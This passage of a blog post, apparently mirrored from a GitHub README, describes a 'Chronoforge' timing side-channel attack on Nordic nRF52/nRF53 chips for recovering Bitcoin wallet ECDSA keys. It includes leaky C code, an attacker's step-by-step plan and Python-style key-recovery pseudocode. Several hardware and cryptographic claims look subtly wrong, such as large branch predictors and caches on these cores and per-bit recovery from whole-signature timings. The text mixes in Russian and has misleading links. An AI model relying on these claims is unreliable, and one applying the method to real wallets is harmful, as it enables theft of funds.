<h2 class="wp-block-heading">Defense and countermeasures</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#defense-and-countermeasures"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Why is the nRF5340 vulnerable?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#why-is-the-nrf5340-vulnerable"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Lack of <strong>constant-time</strong> implementation of scalar multiplication operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Insufficient shielding against electromagnetic and time leakage</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using the standard Montgomery ladder algorithm without masking[ <a href="https://yuval.yarom.org/pdfs/AlamYWSZGYP21.pdf">yuval.yarom</a> ]</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Defense mechanisms</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#defense-mechanisms"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Hardware security modules (HSMs)</strong>&nbsp;: using specialized hardware with built-in security [&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">docs.aqtiveguard</a>&nbsp;]</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Constant-time coding</strong>&nbsp;(RFC 7748): all operations are performed at the same time, regardless of the data</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Masking</strong>&nbsp;: adding random noise to intermediate values</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Isolation</strong>&nbsp;: physical separation of cryptographic operations from other processes</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Chronoforge CPA&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attack</a>&nbsp;demonstrates that&nbsp;<strong>information about the execution time of cryptographic operations can completely&nbsp;</strong><a href="https://cryptou.ru/vulncipher/privatekey"><strong>compromise an ECDSA private key</strong>&nbsp;.</a>&nbsp;An average recovery accuracy of 94.5% on real hardware (nRF5340) demonstrates that this is not a theoretical threat, but a practical way to compromise wallets.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptou.ru/vulncipher/bitcoin">For Bitcoin users it is recommended:</a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Use wallets that implement constant-time <a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">ECDSA</a> implementations (e.g., <a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1</a> with proven security)[ <a href="https://www.emergentmind.com/topics/libsecp256k1-cryptographic-library">emergentmind</a> ]</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Avoid storing keys on devices without hardware security (HSM)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Monitor your addresses for unauthorized transactions</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Detailed information:&nbsp;<strong><a href="https://polynonce.ru/chronoforge-attack-cpa-statistical-analysis-for-ecdsa-private-key-recovery/">Chronoforge Attack: CPA Statistical Analysis for ECDSA Private Key Recovery</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-13.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-13.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">4. Specifics of ARM TrustZone and Nordic nRF52/nRF53</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4-specifics-of-arm-trustzone-and-nordic-nrf52nrf53"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.1 Architectural Features Enhance Chronoforge Attack</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#41-architectural-features-enhance-chronoforge-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">4.1.1 Shared Microarchitectural Elements</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#411-shared-microarchitectural-elements"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On Nordic nRF52/nRF53 microcontrollers based on Cortex-M4F (nRF52) and Cortex-M33F (nRF53):</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>L1 Instruction Cache (I-Cache):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Size: 8-16 KB (depending on models)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Associativity: 2-way or 4-way</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>VULNERABILITY:</strong> Cache lines are not isolated between Secure and Normal World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Result: Secure World cryptographic code can be “profiled” through cache timing</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>L1 Data Cache (D-Cache):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Size: 8 KB</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Associativity: 2-way</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>VULNERABILITY:</strong> Lookup tables for fast elliptic curve multiplication become visible through cache access timing</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Example: If Secure World uses a table to speed up scalar multiplication:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>  const uint8_t table&#91;256]&#91;32];  // Pre-computed window values</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><br><br><br>Then the access pattern to this table can be restored from the Normal World via:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>  1. Measurement cache hit/miss timing
  2. Flush+Reload attack
  3. Prime+Probe attack</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">4.1.2 Branch Prediction Unit (BPU)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#412-branch-prediction-unit-bpu"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cortex-M4F/M33F contain a simple Branch Predictor (~256 entries) that:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Shared</strong> between Secure and Normal World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Can be profiled</strong> via timing side-channel</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Reveals the control flow</strong> of cryptographic code in Secure World</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Timing difference due to branch misprediction can be 10-50 clock cycles (0.1-0.5 µs on a 100 MHz clock).</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Branch Prediction Unit (BPU): Source of Timing Leaks:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#branch-prediction-unit-bpu-source-of-timing-leaks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Branch Prediction Timing Leak Example<br><br>void point_add_bpu_leak(point_t *result, const point_t *p, const point_t *q) {<br>    int secret_bit = get_private_key_bit();<br><br>    if (secret_bit) {  // Branch prediction: ~50% initial accuracy<br>        // Path A: ~5.8 µs<br>        result-&gt;x = (p-&gt;x + q-&gt;x) % PRIME;<br>        result-&gt;y = (p-&gt;y + q-&gt;y) % PRIME;<br>        // Misprediction penalty: ~0.1 µs<br>    } else {<br>        // Path B: ~0 µs skip<br>        // BPU learns pattern after 20-50 observations<br>    }<br>}<br><br>// ATTACK VECTOR:<br>// - BPU has 256 entries on Cortex-M4F/M33F<br>// - Prediction learning: 20-50 branches<br>// - Timing difference: 0.1 µs per misprediction<br>// - Correlation enables pattern recovery<br>// - Adds +5% accuracy improvement to timing attack</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>The presented code demonstrates&nbsp;<strong>a critical timing side-channel vulnerability</strong>&nbsp;based on&nbsp;<strong>the Branch Prediction Unit (BPU)</strong>&nbsp;in the context of elliptic curve cryptography. This is a dangerous attack vector that allows&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">ECDSA private keys to be recovered</a>&nbsp;through microtiming analysis.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Point by point: How the attack works</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-by-point-how-the-attack-works"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">1.&nbsp;<strong>Function&nbsp;<code>point_add_bpu_leak()</code>– Entry point for attack</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1functionpoint_add_bpu_leak-entry-point-for-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c:<br><br><code>void point_add_bpu_leak(point_t *result, const point_t *p, const point_t *q) {    int secret_bit = get_private_key_bit();        if (secret_bit) {  <em>// Secret-dependent branch</em>        <em>// Path A</em>    } else {        <em>// Path B</em>    }}</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>The essence of the problem:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The function performs a conditional jump based on <strong>a bit <a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a></strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This creates <strong>a data-dependent control flow</strong> – the basis for timing attacks.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The processor cannot know in advance which path the branch will take until the condition is evaluated.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Branch direction information <strong>is stored in the BPU</strong> for future predictions.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.&nbsp;<strong>Initial prediction accuracy (~50%)</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2initial-prediction-accuracy-50"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// BPU has 256 entries on Cortex-M4F/M33F// Prediction learning: 20-50 branches// Initial accuracy: ~50% (случайное угадывание)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Explanation:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>The BPU contains 256 entries</strong> for storing branch history.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>First pass</strong> : BPU has no historical data, so it predicts with <strong>~50% accuracy</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Each input in the code (IP – Instruction Pointer) corresponds to its own input in the BPU</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The first time the processor guesses: will the branch be taken or not?</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>How it works in code:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>First execution:    secret_bit = 1, predicts "not taken" (50% accuracy)                    ↓ MISPREDICTION (штраф: 0.1 µs)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.&nbsp;<strong>BPU Training – Pattern-Based Prediction</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3bpu-training--pattern-based-prediction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Pattern learning: 20-50 branches// After 20-50 observations, BPU learns the pattern</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Learning mechanism:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Repeat</th><th>secret_bit</th><th>BPU prediction</th><th>Result</th><th>Accuracy</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>2</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>3</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>25</td><td>1</td><td><strong>taken</strong></td><td>✅ CORRECT</td><td>↑</td></tr><tr><td>26</td><td>1</td><td>taken</td><td>✅ CORRECT</td><td>↑</td></tr><tr><td>50</td><td>1</td><td>taken</td><td>✅ CORRECT</td><td><strong>~95-98%</strong></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>How BPU is trained:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Pattern History Table (PHT)</strong> tracks the history of branching directions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>2-level predictor</strong> uses: <code>(branch_address, recent_history)</code>→ prediction</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>After <strong>20-50 observations,</strong> the BPU clearly identifies the pattern: “this bit is always 1”</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>BPU goes into a <strong>strongly taken</strong> or <strong>strongly not taken state</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.&nbsp;<strong>Timing Penalty for incorrect prediction</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4timing-penalty-for-incorrect-prediction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c<code>if (secret_bit) {  <em>// Branch prediction: ~50% initial accuracy</em>    <em>// Path A: ~5.8 µs</em>    result-&gt;x = (p-&gt;x + q-&gt;x) % PRIME;    result-&gt;y = (p-&gt;y + q-&gt;y) % PRIME;    <em>// Misprediction penalty: ~0.1 µs</em>} else {    <em>// Path B: ~0 µs skip (ветвление не взято)</em>}</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Time Cost Analysis:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Scenario</th><th>Time</th><th>Cause</th></tr></thead><tbody><tr><td>Correct prediction (Path A taken)</td><td>5.8 µs</td><td>The processor speculatively loads Path A instructions</td></tr><tr><td>Misprediction (predicted not taken, but actually taken)</td><td>5.8 + 0.1 µs</td><td>Pipeline flush + reload from the right path</td></tr><tr><td>Path B (not taken)</td><td>~0 µs</td><td>No operations, just a pass</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>How does the error penalty work?</strong></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>Misprediction Timeline: <br>├─ Cycle 1-2: Fetch stage reads branch IP <br>├─ Cycle 3-4: Decode realizes this is a conditional branch <br>├─ Cycle 5-6: Execute evaluates condition <br>├─ Cycle 7: BPU predicted wrong path → speculatively loads instructions <br>├─ Cycle 8-20: Speculatively executes instructions on the wrong path <br>├─ Cycle 21: Check result - error! <br>├─ Cycle 22: PIPELINE FLUSH (clear all speculative operations) <br>├─ Cycle 23-30: Reload on the right path <br>└─ Total penalty: ~0.1 µs (on ARM Cortex-M4F/M33F processors)</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-14.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-14.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">5.&nbsp;<strong>Attack Vector: Measuring the Difference in Execution Time</strong></a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5attack-vector-measuring-the-difference-in-execution-time"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// ATTACK VECTOR:
// - Timing difference: 0.1 µs per misprediction
// - Correlation enables pattern recovery</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>How an attacker extracts a private key:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>Step 1: Run multiple signatures (N signatures) <br>├─ Each signature uses ECDSA with dot multiplication <br>├─ During multiplication: k G secret_bits from k are used <br>└─ The point_add_bpu_leak() function is called N times <br><br>Step 2: Measure execution time <br>├─ For each call: measure execution time with a resolution of ~0.1 µs <br>├─ The distribution of times shows two patterns: <br>│ ├─ Cluster 1: ~5.8 µs (branch taken, correct prediction) <br>│ └─ Cluster 2: ~5.9 µs (branch taken, misprediction was) <br>└─ The difference in times correlates with the BPU training state <br><br>Step 3: Statistical analysis <br>├─ Misprediction probability analysis = frequency of slow executions <br>├─ High misprediction probability → branch is often taken (bit = 1) <br>├─ Low misprediction probability → branch is rarely taken (bit = 0) <br>└─ Private key bits are statistically recovered from N signatures <br><br>Stage 4: Private key recovery <br>├─ ~100-200 bits collected from ~50 signatures <br>├─ Hidden Number Problem (HNP) is used <br>├─ LLL lattice reduction algorithm is applied <br>└─ Full 256-bit ECDSA private key is recovered</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-15-1024x642.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-15-1024x642.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6.&nbsp;<strong>ARM Cortex-M4F/M33F specifics</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#6arm-cortex-m4fm33f-specifics"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// BPU has 256 entries on Cortex-M4F/M33F</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Features of these processors:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Parameter</th><th>Meaning</th><th>Significance for attack</th></tr></thead><tbody><tr><td>BPU entries</td><td>256</td><td>256 different branch addresses can be monitored simultaneously</td></tr><tr><td>Pipeline depth</td><td>3 stage (M4), 2-3 stage (M33)</td><td>Less overlap, more accurate timing</td></tr><tr><td>Prediction model</td><td>2-level directional</td><td>Can remember and learn complex patterns</td></tr><tr><td>Misprediction penalty</td><td>~0.1 µs</td><td>Microtiming is measured with an accuracy of ns, which is sufficient</td></tr><tr><td>Clock frequency</td><td>100-120 MHz typical</td><td>0.1 µs = 10-12 processor cycles – easy to measure</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">7.&nbsp;<strong>Correlation and information extracted by the attack</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7correlation-and-information-extracted-by-the-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Correlation enables pattern recovery// Adds +5% accuracy improvement to timing attack</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What is correlation in this context:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Time Series</strong> : Sequence of execution times of N signatures text<code>T = [5.8, 5.9, 5.8, 5.9, 5.8, 5.8, 5.8, 5.9, ...]</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>BPU state series</strong> : The BPU predictor state for each text signature<code>BPU_state = [trained_on_1, trained_on_1, trained_on_1, trained_on_1, ...]</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Correlation</strong> : A high correlation between <code>T</code>and <code>BPU_state</code>→ confirms that:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/privatekey">The private key</a> bits actually control the BPU</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A certain branching pattern corresponds to certain bits</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Improvement +5%</strong>:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Basic timing attack: ~90% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>With BPU analysis: ~95% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>An additional 5% allows you to recover the key with fewer signatures</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">A practical example of private key recovery</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#a-practical-example-of-private-key-recovery"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Attack scenario:</a></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#attack-scenario"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Приватный ключ (256-bit):private_key = 0xc9afe9d845ba2018... (256 бит)Binary:      11001001101011111110100111011000...ECDSA подпись k·G + использует point_add_bpu_leak()</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">The attacker takes 50 signatures:</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#the-attacker-takes-50-signatures"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>python:<br><br><code><em># Псевдокод атаки</em>timings = []for i in range(50):    t_start = timer()    ecdsa_sign(message_i)  <em># Использует point_add_bpu_leak()</em>    t_end = timer()    timings.append(t_end - t_start)<em># Анализ временных распределений</em>bit_predictions = []for bit_position in range(256):    <em># Для каждой позиции бита в k</em>    probabilities = analyze_misprediction_rates(timings, bit_position)        if probabilities['high_misprediction']:        bit_predictions.append(1)  <em># Бит часто вызывает misprediction</em>    else:        bit_predictions.append(0)<em># Восстановление через HNP + LLL lattice reduction</em>recovered_key = hnp_to_private_key(bit_predictions)</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Result:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>40-100 accurate bits</strong> from 50 signatures</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Lattice reduction</strong> restores the remaining bits</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>A full 256-bit <a href="https://cryptou.ru/vulncipher/privatekey">private key</a></strong> was recovered in <strong>2-10 minutes</strong> on a regular computer.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-bitcoin">Why is this dangerous for&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin cryptocurrency?</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#why-is-this-dangerous-forbitcoin-cryptocurrency"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">1.&nbsp;<strong>Theft of funds from hardware wallets</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1theft-of-funds-from-hardware-wallets"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Many hardware wallets (Ledger, Trezor) use Cortex-M4F</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If insecure ECDSA is running on Cortex-M4F, the key is recovered</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">2.&nbsp;<strong>Cloud services and virtualization</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2cloud-services-and-virtualization"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If there are multiple VMs on a single host, an attacker can:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Run VM1 with wallet <em>(victim)</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Run VM2 with spy process <a href="https://cryptou.ru/vulncipher/attack"><em>(attacker)</em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Measure timing information about point_add_bpu_leak() from VM1</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">3.&nbsp;<strong>IoT and embedded systems</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3iot-and-embedded-systems"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Cryptocurrency exchange servers often run on ARM-based systems.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/attack">The attack</a> allows you to restore hot keys within hours</li>
